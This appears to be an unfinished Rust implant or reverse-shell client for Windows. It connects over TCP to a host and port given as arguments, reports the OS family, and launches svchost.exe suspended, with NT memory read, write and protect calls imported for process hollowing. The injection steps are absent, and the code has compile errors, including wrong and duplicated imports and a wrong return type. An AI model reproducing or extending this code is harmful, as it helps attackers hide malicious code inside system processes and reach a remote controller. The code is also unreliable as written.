use winapi::ctypes::c_void;
use winapi::errhandlingapi::GetLastError;
use winapi::shared::minwindef::BOOL;
use winapi::shared::ntdef::PSTR;
use winapi::um::processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA};
use winapi::um::winnt::PAGE_READWRITE;
use winapi::winbase::CREATE_SUSPENDED;
use winapi::winnt::{
    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE, PAGE_READWRITE,
};
use winapi::NT_SUCCESS;

use ntapi::{
    ntmmapi::{NtProtectVirtualMemory, NtReadVirtualMemory, NtWriteVirtualMemory},
    ntpsapi::{
        NtQueryInformationProcess, NtResumeThread, PROCESSINFOCLASS, PROCESS_BASIC_INFORMATION,
    },
};

use std::io::{Error, Write};
use std::net::TcpStream;
use std::process::exit;
use std::{ffi::CString, mem::size_of, ptr::null_mut};

pub fn client(i: &str, p: &str) -> Result<(), Error> {
    let mut stream = TcpStream::connect(i.to_owned() + ":" + p)?;

    let os = std::env::consts::FAMILY;
    match stream.write_all(os.as_bytes()) {
        Ok(_) => (),
        Err(e) => {
            println!("Error sending OS info : {}", e);
            exit(1);
        }
    }

    let svchost = CString::new("C:\\Windows\\System32\\svchost.exe")?.into_raw();
    let lp_app_name = null_mut();
    let mut startup_info = STARTUPINFOA::default();
    let mut process_info = PROCESS_INFORMATION::default();

    let create_proc_stat: BOOL = unsafe {
        CreateProcessA(
            lp_app_name,
            svchost,
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut startup_info,
            &mut process_info,
        )
    };

    if create_proc_stat == 0 {
        let err = unsafe { GetLastError() };
        let err_msg = format!("Error creating process: {}", err);
        return err;
    }
    Ok(())
}
